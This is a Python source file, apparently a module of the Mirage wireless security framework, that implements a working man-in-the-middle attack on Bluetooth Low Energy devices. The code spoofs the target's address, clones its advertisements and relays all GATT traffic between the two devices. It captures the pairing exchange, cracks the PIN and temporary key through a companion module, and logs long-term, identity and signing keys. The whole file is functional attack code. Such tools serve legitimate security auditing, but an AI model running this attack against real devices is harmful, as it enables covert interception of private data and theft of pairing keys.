import multiprocessing
from enum import IntEnum
from mirage.libs import io,utils,ble
from mirage.core import module

class BLEMitmStage(IntEnum):
	SCAN = 1
	CLONE = 2
	WAIT_CONNECTION = 3
	ACTIVE_MITM = 4
	STOP = 5

class ble_mitm(module.WirelessModule):
	def checkCapabilities(self):
		a2scap = self.a2sEmitter.hasCapabilities("COMMUNICATING_AS_MASTER","INITIATING_CONNECTION","SCANNING")
		a2mcap = self.a2mEmitter.hasCapabilities("COMMUNICATING_AS_SLAVE","RECEIVING_CONNECTION","ADVERTISING")
		return a2scap and a2mcap

	def init(self):
		self.technology = "ble"
		self.type = "attack"
		self.description = "Man-in-the-Middle module for Bluetooth Low Energy devices"
		self.args = {
				"INTERFACE1":"hci0", # must allow to change BD Address
				"INTERFACE2":"hci1",
				"TARGET":"FC:58:FA:A1:26:6B",
				"CONNECTION_TYPE":"public",
				"SLAVE_SPOOFING":"yes",
				"MASTER_SPOOFING":"yes",
				"ADVERTISING_STRATEGY":"preconnect", # "preconnect" (btlejuice) or "flood" (gattacker)
				"SHOW_SCANNING":"yes",
				"SCENARIO":"",
				"LTK":""
				
			}
		self.stage = BLEMitmStage.SCAN
		# Security Manager related
		self.pReq = None
		self.pRes = None
		self.initiatorAddress = None
		self.initiatorAddressType = None
		self.responderAddress = None
		self.responderAddressType = None
		self.mRand = None
		self.mConfirm = None
		self.sRand = None
		self.sConfirm = None
		self.forgedmRand = None
		self.forgedsRand = None
		self.temporaryKey = None

		self.addrType = None
		self.address = None
		self.intervalMin = None
		self.intervalMax = None
		self.dataAdvInd = None
		self.dataScanRsp = None
	# Scenario-related methods
	@module.scenarioSignal("onStart")
	def startScenario(self):
		pass

	@module.scenarioSignal("onEnd")
	def endScenario(self):
		pass

	# Configuration methods
	def initEmittersAndReceivers(self):
		attackerToSlaveInterface = self.args["INTERFACE1"]
		attackerToMasterInterface = self.args["INTERFACE2"]

		self.a2sEmitter = self.getEmitter(interface=attackerToSlaveInterface)
		self.a2sReceiver = self.getReceiver(interface=attackerToSlaveInterface)

		self.a2mEmitter = self.getEmitter(interface=attackerToMasterInterface)
		self.a2mReceiver = self.getReceiver(interface=attackerToMasterInterface)

		if not self.a2mEmitter.isAddressChangeable() and utils.booleanArg(self.args["SLAVE_SPOOFING"]):
			io.warning("Interface "+attackerToMasterInterface+" is not able to change its address : "
				   "Address spoofing will not be enabled !")


	# Stage related methods
	def getStage(self):
		return self.stage

	@module.scenarioSignal("onStageChange")
	def setStage(self, value):
		self.stage = value

	def waitUntilStage(self,stage):
		while self.getStage() != stage:
			utils.wait(seconds=0.01)

	# Advertising related methods
	@module.scenarioSignal("onSlaveAdvertisement")
	def scanStage(self,packet):
		if utils.booleanArg(self.args["SHOW_SCANNING"]):
			packet.show()
		if self.getStage() == BLEMitmStage.SCAN:
			if utils.addressArg(self.args["TARGET"]) == packet.addr.upper():
				if packet.type == "ADV_IND":
					io.success("Found corresponding advertisement !")
					self.address = utils.addressArg(self.args["TARGET"])
					data = packet.getRawDatas()
					self.intervalMin = packet.intervalMin
					self.intervalMax = packet.intervalMax
					self.addrType = packet.addrType
					self.dataAdvInd = data
				elif packet.type == "SCAN_RSP":
					self.dataScanRsp = packet.getRawDatas()
				
			if self.dataAdvInd is not None and self.dataScanRsp is not None:
				self.cloneStage(self.address,self.dataAdvInd,self.dataScanRsp,self.intervalMin,self.intervalMax,self.addrType)

	@module.scenarioSignal("onCloning")
	def cloneStage(self,address,data,dataResponse,intervalMin, intervalMax,addrType):
		io.info("Entering CLONE stage ...")		
		self.setStage(BLEMitmStage.CLONE)
		
		if self.args["ADVERTISING_STRATEGY"] == "flood":
			intervalMin = 200
			intervalMax = 201


		if utils.booleanArg(self.args["SLAVE_SPOOFING"]) and address != self.a2mEmitter.getAddress():
			self.a2mEmitter.setAddress(address, random=addrType)
		self.a2mEmitter.setScanningParameters(data=dataResponse)
		self.a2mEmitter.setAdvertisingParameters(data=data, intervalMin=intervalMin, intervalMax=intervalMax, daType=addrType, oaType=addrType)


	# Connection related methods
	@module.scenarioSignal("onSlaveConnect")
	def connectOnSlave(self,initiatorType="public"):
		while self.a2sEmitter.getMode() != "NORMAL":
			utils.wait(seconds=1)
			print(self.a2sEmitter.getMode())

		address = utils.addressArg(self.args["TARGET"])
		connectionType = self.args["CONNECTION_TYPE"]

		self.responderAddress = address
		self.responderAddressType = b"\x00" if self.args["CONNECTION_TYPE"] == "public" else b"\x01"
		io.info("Connecting to slave "+address+"...")
		self.a2sEmitter.sendp(ble.BLEConnect(
					dstAddr=address,
					type=connectionType,
					initiatorType=initiatorType
					)
				)
		while not self.a2sEmitter.isConnected():
			utils.wait(seconds=0.5)
		io.success("Connected on slave : "+self.a2sReceiver.getCurrentConnection())

	@module.scenarioSignal("onMasterConnect")
	def connect(self,packet):
		if self.getStage() == BLEMitmStage.WAIT_CONNECTION:

			io.success("Master connected : "+packet.srcAddr)

			self.initiatorAddress = packet.srcAddr
			self.initiatorAddressType = b"\x00" if packet.type == "public" else b"\x01"

			if self.args["ADVERTISING_STRATEGY"] == "preconnect":
				if utils.booleanArg(self.args["MASTER_SPOOFING"]):
					self.a2sEmitter.sendp(ble.BLEDisconnect())
					while self.a2sEmitter.isConnected():
						utils.wait(seconds=0.01)
					self.a2sEmitter.setAddress(packet.srcAddr,random=packet.type == "random")
					address = utils.addressArg(self.args["TARGET"])
					connectionType = self.args["CONNECTION_TYPE"]
					io.info("Connecting to slave "+address+"...")
					self.a2sEmitter.sendp(ble.BLEConnect(
								dstAddr=address,
								type=connectionType,
								initiatorType=packet.type
								)
							)
					while not self.a2sEmitter.isConnected():
						utils.wait(seconds=0.01)
			if self.args["ADVERTISING_STRATEGY"] == "flood":
				if utils.booleanArg(self.args["MASTER_SPOOFING"]):
					self.a2sEmitter.setAddress(packet.srcAddr,random=packet.type == "random")
				self.connectOnSlave(packet.type)
			self.setStage(BLEMitmStage.ACTIVE_MITM)
			io.info("Entering ACTIVE_MITM stage ...")

	@module.scenarioSignal("onMasterDisconnect")
	def disconnectMaster(self,packet):
		io.info("Master disconnected !")
		if self.a2sReceiver.isConnected():
			self.a2sEmitter.sendp(ble.BLEDisconnect())
		self.setStage(BLEMitmStage.STOP)

	@module.scenarioSignal("onSlaveDisconnect")
	def disconnectSlave(self,packet):
		io.info("Slave disconnected !")
	

	@module.scenarioSignal("onMasterExchangeMTURequest")
	def exchangeMtuRequest(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Exchange MTU Request (from master) : mtu = "+str(packet.mtu))
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEExchangeMTURequest(mtu=packet.mtu))

	@module.scenarioSignal("onSlaveExchangeMTUResponse")
	def exchangeMtuResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Exchange MTU Response (from slave) : mtu = "+str(packet.mtu))
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEExchangeMTUResponse(mtu=packet.mtu))
	
	@module.scenarioSignal("onMasterWriteCommand")
	def writeCommand(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Write Command (from master) : handle = "+hex(packet.handle)+" / value = "+packet.value.hex())
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEWriteCommand(handle=packet.handle, value=packet.value))

	@module.scenarioSignal("onMasterWriteRequest")
	def writeRequest(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Write Request (from master) : handle = "+hex(packet.handle)+" / value = "+packet.value.hex())
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEWriteRequest(handle=packet.handle, value=packet.value))

	@module.scenarioSignal("onSlaveWriteResponse")
	def writeResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Write Response (from slave)")
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEWriteResponse())

	@module.scenarioSignal("onMasterReadBlobRequest")
	def readBlob(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Read Blob Request (from master) : handle = "+hex(packet.handle)+" / offset = "+str(packet.offset))
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEReadBlobRequest(handle=packet.handle,offset=packet.offset))

	@module.scenarioSignal("onSlaveReadBlobResponse")
	def readBlobResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Read Blob Response (from slave) : value = "+packet.value.hex())
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEReadBlobResponse(value=packet.value))

	@module.scenarioSignal("onMasterReadRequest")
	def read(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Read Request (from master) : handle = "+hex(packet.handle))
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEReadRequest(handle=packet.handle))

	@module.scenarioSignal("onSlaveReadResponse")
	def readResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Read Response (from slave) : value = "+packet.value.hex())
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEReadResponse(value=packet.value))

	@module.scenarioSignal("onSlaveErrorResponse")
	def errorResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Error Response (from slave) : request = "+hex(packet.request)+
				" / handle = "+hex(packet.handle)+" / ecode = "+hex(packet.ecode))
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEErrorResponse(request=packet.request,handle=packet.handle,ecode=packet.ecode))

	@module.scenarioSignal("onSlaveHandleValueNotification")	
	def notification(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Handle Value Notification (from slave) : handle = "+hex(packet.handle)+
				" / value = "+packet.value.hex())
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle,value=packet.value))

	@module.scenarioSignal("onSlaveHandleValueIndication")	
	def indication(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Handle Value Indication (from slave) : handle = "+hex(packet.handle)+
				" / value = "+packet.value.hex())
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEHandleValueIndication(handle=packet.handle,value=packet.value))

	@module.scenarioSignal("onMasterHandleValueConfirmation")
	def confirmation(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Handle Value Confirmation (from master)")
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEHandleValueConfirmation())

	@module.scenarioSignal("onMasterFindInformationRequest")
	def findInformation(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Find Information Request (from master) : startHandle = "+hex(packet.startHandle)+
				" / endHandle = "+hex(packet.endHandle))
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEFindInformationRequest(startHandle=packet.startHandle,endHandle=packet.endHandle))

	@module.scenarioSignal("onSlaveFindInformationResponse")
	def findInformationResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Find Information Response (from slave) : format = "+hex(packet.format)+
				" / data = "+packet.data.hex())
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEFindInformationResponse(format=packet.format,data=packet.data))

	@module.scenarioSignal("onMasterReadByTypeRequest")
	def readByType(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Read By Type Request (from master) : startHandle = "+hex(packet.startHandle)+
				" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid))
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEReadByTypeRequest( startHandle=packet.startHandle,
										endHandle=packet.endHandle,
										uuid=packet.uuid))
	@module.scenarioSignal("onMasterReadByGroupTypeRequest")
	def readByGroupType(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Read By Group Type Request (from master) : startHandle = "+hex(packet.startHandle)+
			" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid))
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEReadByGroupTypeRequest( 	startHandle=packet.startHandle,
										endHandle=packet.endHandle,
										uuid=packet.uuid))

	@module.scenarioSignal("onSlaveReadByTypeResponse")
	def readByTypeResponse(self,packet):
			io.info("Read By Type Response (from slave) : data = "+packet.data.hex())
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEReadByTypeResponse(data=packet.data))

	@module.scenarioSignal("onSlaveReadByGroupTypeResponse")
	def readByGroupTypeResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Read By Group Type Response (from slave) : length = "+str(packet.length)+
				" / data = "+packet.data.hex())
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEReadByGroupTypeResponse(length=packet.length, data=packet.data))

	@module.scenarioSignal("onMasterLongTermKeyRequest")
	def longTermKeyRequest(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Long Term Key Request (from master) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
			if packet.ediv == 0 and packet.rand == b"\x00"*8:
				self.shortTermKey = ble.BLECrypto.s1(self.temporaryKey,self.mRand,self.sRand)[::-1]
				io.info("Derivating Short Term Key : " + self.shortTermKey.hex())
				io.info("Redirecting to slave ...")
				self.a2sEmitter.sendp(ble.BLELongTermKeyRequest(rand=packet.rand, ediv=packet.ediv,ltk=self.shortTermKey))
				self.a2mEmitter.sendp(ble.BLELongTermKeyRequestReply(positive=True, ltk=self.shortTermKey))
			else:
				if self.args["LTK"] != "":
					io.info("Using LTK provided : "+self.args["LTK"])
					io.info("Redirecting to slave ...")
					self.a2sEmitter.sendp(ble.BLELongTermKeyRequest(rand=packet.rand, ediv=packet.ediv, ltk=bytes.fromhex(self.args["LTK"])))
					self.a2mEmitter.sendp(ble.BLELongTermKeyRequestReply(positive=True, ltk=bytes.fromhex(self.args["LTK"])))
				else:
					io.info("No LTK provided, encryption not enabled.")
					self.a2mEmitter.sendp(ble.BLELongTermKeyRequestReply(positive=False))


	@module.scenarioSignal("onMasterPairingRequest")
	def pairingRequest(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info(("Pairing Request (from master) : " +
			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") + 
			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) + 
			"\n=> maxKeySize = "+ str(packet.maxKeySize) + 
			"\n=> initiatorKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
			"\n=> responderKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
			 
			io.info ("Storing Pairing Request's payload :"+packet.payload.hex())
			self.pReq = packet.payload[::-1]
			
			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEPairingRequest(
									outOfBand=packet.outOfBand,
									inputOutputCapability=packet.inputOutputCapability,
									authentication=packet.authentication,
									maxKeySize=packet.maxKeySize,
									initiatorKeyDistribution=packet.initiatorKeyDistribution,
									responderKeyDistribution=packet.responderKeyDistribution
								)
						)

	@module.scenarioSignal("onSlavePairingResponse")
	def pairingResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info(("Pairing Response (from slave) : " + 
			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") + 
			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) + 
			"\n=> maxKeySize = "+ str(packet.maxKeySize) + 
			"\n=> initiatorKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
			"\n=> responderKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
			io.info ("Storing Pairing Response's payload :"+packet.payload.hex())
			self.pRes = packet.payload[::-1]

			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEPairingResponse(
									outOfBand=packet.outOfBand,
									inputOutputCapability=packet.inputOutputCapability,
									authentication=packet.authentication,
									maxKeySize=packet.maxKeySize,
									initiatorKeyDistribution=packet.initiatorKeyDistribution,
									responderKeyDistribution=packet.responderKeyDistribution
								)
						)

	@module.scenarioSignal("onMasterPairingConfirm")
	def masterPairingConfirm(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Pairing Confirm (from master) : confirm = " + packet.confirm.hex())

			io.info ("Storing mConfirm : "+packet.confirm.hex())
			self.mConfirm = packet.confirm[::-1]

			io.info("Redirecting to slave ...")
			self.a2sEmitter.sendp(ble.BLEPairingConfirm(confirm=packet.confirm))

	@module.scenarioSignal("onSlavePairingConfirm")
	def slavePairingConfirm(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Pairing Confirm (from slave) : confirm = " + packet.confirm.hex())

			io.info ("Storing sConfirm : "+packet.confirm.hex())
			self.sConfirm = packet.confirm[::-1]

			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEPairingConfirm(confirm=packet.confirm))
						
	@module.scenarioSignal("onMasterPairingRandom")
	def masterPairingRandom(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Pairing Random (from master) : random = "+packet.random.hex())
			io.info("Storing mRand : "+packet.random.hex())
			self.mRand = packet.random[::-1]
			m = utils.loadModule("ble_crack")
			m["MASTER_RAND"] = self.mRand.hex()
			m["PAIRING_REQUEST"] = self.pReq.hex()
			m["PAIRING_RESPONSE"] = self.pRes.hex()
			m["INITIATOR_ADDRESS_TYPE"] = "public" if self.initiatorAddressType == b"\x00" else "random"
			m["INITIATOR_ADDRESS"] = self.initiatorAddress
			m["RESPONDER_ADDRESS_TYPE"] = "public" if self.responderAddressType == b"\x00" else "random"
			m["RESPONDER_ADDRESS"] = self.responderAddress
			m["MASTER_CONFIRM"] = self.mConfirm.hex()
			
			output = m.run()
			if output["success"]:
				self.pin = int(output["output"]["PIN"])
				self.temporaryKey = bytes.fromhex(output["output"]["TEMPORARY_KEY"])
			else:
				self.pin = 0
				self.temporaryKey = b"\x00" * 16
			io.info("Redirecting to slave ...")

			self.a2sEmitter.sendp(ble.BLEPairingRandom(random=packet.random))

	@module.scenarioSignal("onSlavePairingRandom")
	def slavePairingRandom(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Pairing Random (from slave) : random = "+packet.random.hex())
			io.info("Storing sRand : "+packet.random.hex())
			self.sRand = packet.random[::-1]
			io.info("Redirecting to master ...")
			#newRandom = ble.BLECrypto.c1m1(self.temporaryKey,self.sConfirm,self.pReq,self.pRes,self.initiatorAddressType,self.initiatorAddress,self.responderAddressType,self.responderAddress)
			#self.forgedsRand = newRandom
			#io.info("Using fake random : "+newRandom.hex())
			self.a2mEmitter.sendp(ble.BLEPairingRandom(random=packet.random))


	def pairingFailed(self,pkt):
		io.fail("Pairing Failed received : "+str(pkt))
		if pkt.reason == ble.SM_ERR_PASSKEY_ENTRY_FAILED:
			io.fail("Reason : Passkey Entry Failed")
		elif pkt.reason == ble.SM_ERR_OOB_NOT_AVAILABLE:
			io.fail("Reason : Out of Band not available")
		elif pkt.reason == ble.SM_ERR_AUTH_REQUIREMENTS:
			io.fail("Reason : Authentication requirements")
		elif pkt.reason == ble.SM_ERR_CONFIRM_VALUE_FAILED:
			io.fail("Reason : Confirm Value failed")
		elif pkt.reason == ble.SM_ERR_PAIRING_NOT_SUPPORTED:
			io.fail("Reason : Pairing not supported")
		elif pkt.reason == ble.SM_ERR_OOB_NOT_AVAILABLE:
			io.fail("Reason : Out of Band not available")
		elif pkt.reason == ble.SM_ERR_ENCRYPTION_KEY_SIZE:
			io.fail("Reason : Encryption key size")
		elif pkt.reason == ble.SM_ERR_COMMAND_NOT_SUPPORTED:
			io.fail("Reason : Command not supported")
		elif pkt.reason == ble.SM_ERR_UNSPECIFIED_REASON:
			io.fail("Reason : Unspecified reason")
		elif pkt.reason == ble.SM_ERR_REPEATED_ATTEMPTS:
			io.fail("Reason : Repeated Attempts")
		elif pkt.reason == ble.SM_ERR_INVALID_PARAMETERS:
			io.fail("Reason : Invalid Parameters")
		elif pkt.reason == ble.SM_ERR_DHKEY_CHECK_FAILED:
			io.fail("Reason : DHKey Check failed")
		elif pkt.reason == ble.SM_ERR_NUMERIC_COMPARISON_FAILED:
			io.fail("Reason : Numeric Comparison failed")
		elif pkt.reason == ble.SM_ERR_BREDR_PAIRING_IN_PROGRESS:
			io.fail("Reason : BR/EDR Pairing in progress")
		elif pkt.reason == ble.SM_ERR_CROSS_TRANSPORT_KEY:
			io.fail("Reason : Cross-transport Key Derivation/Generation not allowed")
		else:
			io.fail("Reason : unknown")

	@module.scenarioSignal("onMasterPairingFailed")
	def masterPairingFailed(self,pkt):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Pairing Failed (from master) !")
			self.pairingFailed(pkt)
			
	@module.scenarioSignal("onSlavePairingFailed")
	def slavePairingFailed(self,pkt):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Pairing Failed (from slave) !")
			self.pairingFailed(pkt)

	@module.scenarioSignal("onSlaveEncryptionInformation")
	def slaveEncryptionInformation(self,packet):
		io.info("Encryption Information (from slave) : Long Term Key = "+packet.ltk.hex())
		io.info("Redirecting to master ...")
		self.a2mEmitter.sendp(ble.BLEEncryptionInformation(ltk=packet.ltk))

	@module.scenarioSignal("onSlaveMasterIdentification")
	def slaveMasterIdentification(self,packet):
		io.info("Master Indentification (from slave) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
		io.info("Redirecting to master ...")		
		self.a2mEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		

	@module.scenarioSignal("onSlaveIdentityAddressInformation")
	def slaveIdentityAddressInformation(self,packet):
		io.info("Identity Address Information (from slave) : address = "+str(packet.address)+" / type = "+packet.type)
		io.info("Redirecting to master ...")		
		self.a2mEmitter.sendp(ble.BLEIdentityAddressInformation(address=packet.address,type=packet.type))

	@module.scenarioSignal("onSlaveIdentityInformation")
	def slaveIdentityInformation(self,packet):
		io.info("Identity Information (from slave) : irk = "+packet.irk.hex())
		io.info("Redirecting to master ...")		
		self.a2mEmitter.sendp(ble.BLEIdentityInformation(irk=packet.irk))

	@module.scenarioSignal("onSlaveSigningInformation")
	def slaveSigningInformation(self,packet):
		io.info("Signing Information (from slave) : csrk = "+packet.csrk.hex())
		io.info("Redirecting to master ...")		
		self.a2mEmitter.sendp(ble.BLESigningInformation(csrk=packet.csrk))


	@module.scenarioSignal("onMasterEncryptionInformation")
	def masterEncryptionInformation(self,packet):
		io.info("Encryption Information (from master) : Long Term Key = "+packet.ltk.hex())
		io.info("Redirecting to slave ...")
		self.a2sEmitter.sendp(ble.BLEEncryptionInformation(ltk=packet.ltk))

	@module.scenarioSignal("onMasterMasterIdentification")
	def masterMasterIdentification(self,packet):
		io.info("Master Indentification (from master) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
		io.info("Redirecting to slave ...")		
		self.a2sEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		

	@module.scenarioSignal("onMasterIdentityAddressInformation")
	def masterIdentityAddressInformation(self,packet):
		io.info("Identity Address Information (from master) : address = "+str(packet.address)+" / type = "+packet.type)
		io.info("Redirecting to slave ...")		
		self.a2sEmitter.sendp(ble.BLEIdentityAddressInformation(address=packet.address,type=packet.type))

	@module.scenarioSignal("onMasterIdentityInformation")
	def masterIdentityInformation(self,packet):
		io.info("Identity Information (from master) : irk = "+packet.irk.hex())
		io.info("Redirecting to slave ...")		
		self.a2sEmitter.sendp(ble.BLEIdentityInformation(irk=packet.irk))

	@module.scenarioSignal("onMasterSigningInformation")
	def masterSigningInformation(self,packet):
		io.info("Signing Information (from master) : csrk = "+packet.csrk.hex())
		io.info("Redirecting to slave ...")		
		self.a2sEmitter.sendp(ble.BLESigningInformation(csrk=packet.csrk))


	@module.scenarioSignal("onSlaveConnectionParameterUpdateRequest")
	def connectionParameterUpdateRequest(self,packet):
		io.info("Connection Parameter Update Request (from slave) : slaveLatency = "+str(packet.slaveLatency)+" / timeoutMult = "+str(packet.timeoutMult)+" / minInterval = "+str(packet.minInterval)+" / maxInterval = "+str(packet.maxInterval))
		io.info("Sending a response to slave ...")
		self.a2sEmitter.updateConnectionParameters(timeout=packet.timeoutMult,latency=packet.slaveLatency, minInterval=packet.minInterval,maxInterval=packet.maxInterval,minCe=0,maxCe=0)
		self.a2sEmitter.sendp(ble.BLEConnectionParameterUpdateResponse(
						moveResult=0
					))
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Redirecting to master ...")
			self.a2mEmitter.sendp(ble.BLEConnectionParameterUpdateRequest(timeoutMult=packet.timeoutMult, slaveLatency=packet.slaveLatency, minInterval=packet.minInterval, maxInterval=packet.maxInterval))
	
			
	@module.scenarioSignal("onMasterConnectionParameterUpdateResponse")
	def connectionParameterUpdateResponse(self,packet):
		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
			io.info("Connection Parameter Update Response (from master) : moveResult = "+str(packet.moveResult))
			'''
			io.info("Sending a response to master ...")
			if packet.moveResult == 0:
				self.a2sEmitter.updateConnectionParameters()	
			'''	

	def checkParametersValidity(self):
		if self.args["ADVERTISING_STRATEGY"] not in ("preconnect","flood"):
			io.fail("You have to select a valid strategy : 'flood' or 'preconnect'")
			return self.nok()
		return None


	def run(self):
		validity = self.checkParametersValidity()
		if validity is not None:
			return validity
		
		self.initEmittersAndReceivers()
		if self.checkCapabilities():
			if self.loadScenario():
				io.info("Scenario loaded !")
				self.startScenario()
			

			# Advertising Callbacks
			self.a2sReceiver.onEvent("BLEAdvertisement",callback=self.scanStage)

			io.info("Entering SCAN stage ...")
			self.setStage(BLEMitmStage.SCAN)

			self.a2sReceiver.setScan(enable=True)

			self.waitUntilStage(BLEMitmStage.CLONE)

			self.a2sReceiver.setScan(enable=False)
			self.a2sReceiver.removeCallbacks()
			if self.args["ADVERTISING_STRATEGY"] == "preconnect":
				self.connectOnSlave()

			self.a2mEmitter.setAdvertising(enable=True)
			io.info("Entering WAIT_CONNECTION stage ...")		
			self.setStage(BLEMitmStage.WAIT_CONNECTION)
			# Connect Callbacks
			self.a2mReceiver.onEvent("BLEConnectResponse",callback=self.connect)

			# Disconnect Callbacks
			self.a2mReceiver.onEvent("BLEDisconnect",callback=self.disconnectMaster)
			self.a2sReceiver.onEvent("BLEDisconnect",callback=self.disconnectSlave)

			# Error Callback
			self.a2sReceiver.onEvent("BLEErrorResponse",callback=self.errorResponse)

			# Write Callbacks
			self.a2mReceiver.onEvent("BLEWriteCommand",callback=self.writeCommand)
			self.a2mReceiver.onEvent("BLEWriteRequest",callback=self.writeRequest)
			self.a2sReceiver.onEvent("BLEWriteResponse",callback=self.writeResponse)

			# Read Callbacks
			self.a2mReceiver.onEvent("BLEReadRequest",callback=self.read)
			self.a2sReceiver.onEvent("BLEReadResponse",callback=self.readResponse)
			self.a2mReceiver.onEvent("BLEReadBlobRequest",callback=self.readBlob)
			self.a2sReceiver.onEvent("BLEReadBlobResponse",callback=self.readBlobResponse)

			# Notification Callback
			self.a2sReceiver.onEvent("BLEHandleValueNotification",callback=self.notification)
			self.a2sReceiver.onEvent("BLEHandleValueIndication",callback=self.indication)
			self.a2mReceiver.onEvent("BLEHandleValueConfirmation",callback=self.confirmation)

			# Find Information Callbacks
			self.a2mReceiver.onEvent("BLEFindInformationRequest", callback=self.findInformation)
			self.a2sReceiver.onEvent("BLEFindInformationResponse",callback=self.findInformationResponse)

			# Read By Callbacks
			self.a2mReceiver.onEvent("BLEReadByTypeRequest",callback=self.readByType)
			self.a2mReceiver.onEvent("BLEReadByGroupTypeRequest",callback=self.readByGroupType)
			self.a2sReceiver.onEvent("BLEReadByTypeResponse",callback=self.readByTypeResponse)
			self.a2sReceiver.onEvent("BLEReadByGroupTypeResponse", callback=self.readByGroupTypeResponse)
			
			# MTU Callbacks
			self.a2mReceiver.onEvent("BLEExchangeMTURequest",callback=self.exchangeMtuRequest)
			self.a2sReceiver.onEvent("BLEExchangeMTUResponse",callback=self.exchangeMtuResponse)

			# Connection Parameter Update Callbacks
			self.a2sReceiver.onEvent("BLEConnectionParameterUpdateRequest",
							callback=self.connectionParameterUpdateRequest)			
			self.a2mReceiver.onEvent("BLEConnectionParameterUpdateResponse",
							callback=self.connectionParameterUpdateResponse)


			# Security Manager Callbacks
			self.a2mReceiver.onEvent("BLELongTermKeyRequest", callback=self.longTermKeyRequest)
			self.a2mReceiver.onEvent("BLEPairingRequest", callback=self.pairingRequest)
			self.a2sReceiver.onEvent("BLEPairingResponse", callback=self.pairingResponse)
			self.a2mReceiver.onEvent("BLEPairingConfirm", callback=self.masterPairingConfirm)
			self.a2sReceiver.onEvent("BLEPairingConfirm", callback=self.slavePairingConfirm)
			self.a2mReceiver.onEvent("BLEPairingRandom", callback=self.masterPairingRandom)
			self.a2sReceiver.onEvent("BLEPairingRandom", callback=self.slavePairingRandom)
			self.a2sReceiver.onEvent("BLEPairingFailed",callback=self.slavePairingFailed)
			self.a2mReceiver.onEvent("BLEPairingFailed",callback=self.masterPairingFailed)

